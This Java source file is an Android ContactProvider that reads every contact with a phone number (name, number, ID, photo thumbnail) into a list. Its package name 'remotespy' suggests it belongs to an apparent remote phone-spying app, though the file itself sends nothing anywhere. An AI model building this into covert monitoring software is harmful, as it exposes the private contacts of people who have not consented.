package org.dalol.remotespy.data.providers;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import org.dalol.remotespy.application.MainApplication;
import org.dalol.remotespy.data.vo.ContactVO;

import java.util.LinkedList;
import java.util.List;

/**
 * @author Filippo Engidashet
 * @version 1.0.0
 * @since Sun, 01/04/2018 at 12:09.
 */
public class ContactProvider implements Provider<List<ContactVO>> {

    @Override
    public List<ContactVO> getData() {

        List<ContactVO> contactVOS = new LinkedList<>();

        String[] projection = new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.HAS_PHONE_NUMBER,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.Contacts.PHOTO_THUMBNAIL_URI
        };

        String _ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
        String _DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME_PRIMARY;
        String _NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
        String _THUMBNAIL = ContactsContract.Contacts.PHOTO_THUMBNAIL_URI;

        Context context = MainApplication.getContext();

        if (context != null) {
            Cursor cursor = context.getContentResolver()
                    .query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            projection,
                            ContactsContract.CommonDataKinds.Phone.HAS_PHONE_NUMBER + "=?",
                            new String[]{"1"},
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);

            if (cursor != null) {

                if (cursor.getCount() > 0) {
                    while (cursor.moveToNext()) {

                        String contact_id = cursor.getString(cursor.getColumnIndex(_ID));
                        String name = cursor.getString(cursor.getColumnIndex(_DISPLAY_NAME));
                        String phoneNumber = cursor.getString(cursor.getColumnIndex(_NUMBER));
                        String photoThumbnail = cursor.getString(cursor.getColumnIndex(_THUMBNAIL));

                        ContactVO contactVO = new ContactVO();
                        contactVO.id = contact_id;
                        contactVO.name = name;
                        contactVO.number = phoneNumber;
                        contactVO.photothumb = photoThumbnail;

                        contactVOS.add(contactVO);
                    }
                }
                cursor.close();
            }
        }
        return contactVOS;
    }
}
